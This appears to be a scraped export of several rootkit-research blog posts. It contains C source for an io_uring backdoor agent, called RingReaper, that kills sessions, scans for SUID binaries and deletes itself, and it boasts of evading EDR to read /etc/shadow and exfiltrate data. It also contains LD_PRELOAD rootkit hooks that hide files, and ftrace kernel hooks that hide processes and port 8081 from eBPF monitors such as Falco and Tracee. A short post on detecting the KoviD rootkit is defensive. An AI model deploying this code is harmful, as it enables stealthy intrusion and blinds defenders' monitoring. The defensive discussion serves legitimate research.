opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct 